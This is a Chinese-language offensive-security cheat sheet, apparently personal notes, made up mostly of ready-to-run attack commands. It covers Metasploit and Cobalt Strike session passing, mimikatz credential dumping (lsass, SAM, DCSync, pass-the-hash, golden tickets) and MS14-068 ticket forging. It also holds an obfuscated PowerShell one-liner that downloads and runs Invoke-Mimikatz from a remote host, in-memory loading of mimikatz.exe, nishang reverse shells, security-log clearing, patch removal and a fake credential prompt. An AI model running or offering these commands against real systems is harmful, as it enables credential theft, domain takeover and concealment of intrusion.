#### Tools(Metasploit，CobaltStrike)

Metasploit

连接数据库

msfdb init

cat /usr/share/metasploit-framework/config/database.yml

db_connect msf:@127.0.0.1/msf

msfdb_status

会话转移

Metasploit(high_level)->CobaltStrike

listen : name Metasploit_CobaltStrike

listen : Beacon HTTP

listen : http_host 192.168.12.130

listen : http_port 20000

use exploit/windows/local/payload_inject

set session 1

set payload windows/meterpreter/reverse_http

set lhost 192.168.12.130

set lport 20000

set DisablePayloadHandler True

set PrependMigrate True

CobaltStrike->Metasploit

use exploit/multi/handler

set payload windows/meterpreter/reverse_http

set lhost 192.168.12.130

set lport 10000

listen : name CobaltStrike_Metasploit #建立一个监听

listen : http_host 192.168.12.130

listen : http_port 10000

beacon> spawn CobaltStrike_Metasploit #运行spawn增加转移会话

------

smb

impacket-smbclient

impacket-smbserver

smbclient

smbmap

crackmapexec

enum4linux

WiFi

aircrack-ng

DNS

dnsenum

dig

dnsnmap

漏洞利用

searchsploit

nessus

ldap

ldapsearch

winrm

evil-winrm

bash

awk sed uniq tr cut grep rev

pwsh and cmd

wmic pwsh

mssql

mssqlclient

嗅探

responder

靠山吃山

gtfobins and lolbas

ids/ips

lbd

wafw00f

web

curl

sqlmap

dirb gobuster feroxbuster dirsearch 御剑

蚁剑

bp

git-dumper

ftp

tftp

wmi

dcom

winrm

snmp

snmp-check

8080

ssh

scp

ssl

ssldump

sslscan

smtp

smtp-user-enum

侦察和打点

fscan

arp-scan

nmap

nikto

whatweb

wpscan

wfuzz

portscan

sweep

fping

穿透

ew

proxychains

nc

pingtunnel

6tunnel

提权

枚举

peass

横向

mimikatz

bloodhound

procdump

后门

密码(哈希)

hash-identifier

nth

keepass2John

hydra

openssl

john

hashcat

cupp

cewl

crunch

框架

metsploit

empire

cs

impacket

powersploit

nishang

二进制

xxd file strings

渗透测试的实质以及最终目标是信息搜集和提升权限

------

bloodhound

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1280.jpg)



bloodhound扫描器

bloodhound-python -c ALL -u administrator -p root@2016 -d one.com -dc DC.one.com -ns 192.168.10.5 --zip

------

fscan

fscan.exe -h 192.168.1.1/24 (默认使用全部模块)

敏感路径

Auto_Wordlists

------

powershell

powershell -ep bypass ". .\powerview.ps1;get-domainuser"

powershell混淆mimikatz

powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.0'+'.101/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"

内存加载

powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.101/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.101/mimikatz.exe -ExeArgs "sekurlsa::logonpasswords" -ForceASLR

------

mimikatz (Procdump)

token::elevate #提升至system权限

privilege::debug

ntlm_hash抓取

lsadump::sam

读取已经打包的dmp

sekurlsa::minidump lsass.dump.dmp

lsass.exe内存抓取

sekurlsa::logonpasswords

导出lsass.exe进程中所有的票据 (会产生大量文件)

sekurlsa::tickets /export

读取所有域用户的哈希(需在域控上执行)

lsadump::lsa /patch

NTDS.DIT文件中提取密码哈希值(在域内任何机器)

lasdump::dcsync /domain:onetop.com /all /csv

PTH

Sekurlsa::pth /user:XX /domian:http://xx.com /ntlm:XXXXXXXX

PTK

sekurlsa::pth /user:xx/domain:xx.com /aes256:xxxxxxxxxxx

sekurlsa模块

获取HASH (LM,NTLM)

sekurlsa::msv

通过可逆的方式去内存中读取明文密码

sekurlsa::wdigest

假如域管理员正好在登陆了我们的电脑，我们可以通过这个命令来获取域管理员的明文密码

sekurlsa::Kerberos

通过tspkg读取明文密码

sekurlsa::tspkg

通过livessp 读取明文密码

sekurlsa::livessp

通过ssp 读取明文密码

sekurlsa::ssp

通过以上各种方法读取明文密码

sekurlsa::logonPasswords

进程模块

process

列出进程列表

process::list

导出进程列表

process::exports

导入列表

process::imports

开始一个进程

process::start

停止一个程序

process::stop

冻结一个进程

process::suspend

从冻结中恢复

process::resume

运行一个程序

process::run notepad

以SYSTEM系统权限打开一个新的mimikatz窗口

process::runp

服务管理模块

service

列出当前服务

service::list

mimikatz 将自己注册为一个系统服务，这样每次系统起来就会自动运行了

service::+

终端服务模块

ts

支持多个用户同时在线

ts::multirdp

查看用户登录信息

ts::sessions

此时会跳出当前用户的账号，在主界面可以看到session为1的那个账号的已经登录了，我们输入密码可以看到他的登录信息，比如他在打开哪些文件

ts::remote /id:1

日志模块

event

清空安全日志

event:clear

避免新的日志继续产生（现在效果还不好，是一个试验性的功能）

event:drop

杂项模块

misc

misc::cmd

misc::regedit

misc::taskmgr

打开cmd，注册表编辑器，任务管理器等

监听剪切板

执行之后会一直监听着，直到我们输入Ctrl+c

misc::clip

令牌模块

token

token::whoami

查看我是谁

token::list

列出都有哪些登录了的账号

token::elevate /lab

假如lab域存在，我们可以假冒成为域管理员的token

token::revert

取消假冒

vault

vault::cred

查看系统凭据

mimikatz.exe lsadump::sam /system:system.hiv /sam:sam.hiv

procdump

procdump64.exe -accepteula -ma lsass.exe lsass.dump

privilege::debug

sekurlsa::minidump lsass.dump.dmp

sekurlsa::logonPasswords full

all module{

standard - Standard module [Basic commands (does not require module name)]

crypto - Crypto Module

sekurlsa - SekurLSA module [Some commands to enumerate credentials...]

kerberos - Kerberos package module []

ngc - Next Generation Cryptography module (kiwi use only) [Some commands to enumerate credentials...]

privilege - Privilege module

process - Process module

service - Service module

lsadump - LsaDump module

ts - Terminal Server module

event - Event module

misc - Miscellaneous module

token - Token manipulation module

vault - Windows Vault/Credential module

minesweeper - MineSweeper module

net -

dpapi - DPAPI Module (by API or RAW access) [Data Protection application programming interface]

busylight - BusyLight Module

sysenv - System Environment Value module

sid - Security Identifiers module

iis - IIS XML Config module

rpc - RPC control of mimikatz

sr98 - RF module for SR98 device and T5577 target

rdm - RF module for RDM(830 AL) device

acr - ACR Module

}mimikatz黄金票据

kerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi

ms14 068自检

systeminfo |find "3011780"

\#MS14-068.exe -u 域用户@xie.com -p 域用户密码 -s 域用户SID只 -d 域控ip

MS14-068.exe -u hack@xie.com -p h123456. -s S-1-5-21-2189311154-2766837956-1982445477-1110 -d 192.168.10.14 

ms14-068.exe -u 域用户@域名 -p 域用户密码 -s 域用户SID -d 域控

ms14-068.exe -u Administrator@god.org -p AAaa1234 -s S-1-5-21-2952760202-1353902439-2381784089-500 -d 192.168.52.141

kerberos::ptc 票据路径

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1282.jpg)

机器名

注：注入票据时，机器不能是03或xp，因为mimikatz不支持这两个机器注入

6.2 隐藏功能

管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：

Copy

privilege::debug

misc::cmd

misc::regedit

misc::taskmgr

------

修改注册表，以求明文

reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1284.jpg)

手工

reg save HKLM\SYSTEM system.hiv

reg save HKLM\SAM sam.hiv

------

msf 和 cs 和 empire 和 nishang

powershell-import PowerUp.ps1

powershell invoke-allchecks

nishang

检查是否为虚拟机

check-vm

欺骗弹窗

invoke-CredentialsPhish

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1286.jpg)



Copy-VSS

sam和system文件

Copy-VSS [文件地址] –默认是在当前文件夹下面

Copy-VSS [文件地址] -DestinationDir C:temp –保存文件到指定文件下

FireBuster和FireListener

FireListener -PortRange 130-150

FireBuster 192.168.12.107 130-150 -Verbose

get-passhashes

哈希值获取

Invoke-PowerShelltcp

nc -lvnp 12345

Invoke-PowerShelltcp -Reverse -IPAddress 192.168.10.133 -Port 12345

invoke-powershelltcp -Bind -Port 3333

nc 192.168.10.1 3333

Invoke-PowerShelludp

nc -lup 23456

Invoke-PowerShelludp -Reverse -IPAddress 192.168.10.133 -Port 23456

invoke-powershelludp -bind -Port 3333

nc -nvu 192.168.10.1 3333

删除补丁

remove-update 

remove-update all

remove-update security

remove-update kbxxxxx

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215224808_1288.jpg)



端口扫描

invoke-portscan -StartAddress 192.168.10.1 -EndAddress 192.168.10.255 -ScanPort -ResolveHost

empire 转交会话给 metsploit

在msf中的配置

获取session(特权用户传递会继承到特权)

exploit/multi/script/web_delivery

\#调用http站点的监听模块

msf6 exploit(multi/script/web_delivery) > set URIPATH /

\#设置路径。设置在根目录比较好调用

msf6 exploit(multi/script/web_delivery) > set LHOST 192.168.0.105

\#设置本地监听地址

msf6 exploit(multi/script/web_delivery) > set target 2 

\#使用Powershell目标

\#target：设置一个反弹会话的方式。Empire是基于powershell的，所以选PSH

msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http 

\#设置payload

\############################################################

在Empire中使用的模块

usemodule powershell_code_execution_invoke_metasploitpayload

\#调用msf模块

\#直接后面跟上meta就可以

set Agent XMUR3TVN

\#设置Agent 记得要使用id，不然会报错。第一次用的是rname后的名字就报错了

\#报错提示：ERROR: Agent not found for id a1 

set URL http://192.168.0.105:8080/

\#设置一下msf中生成的url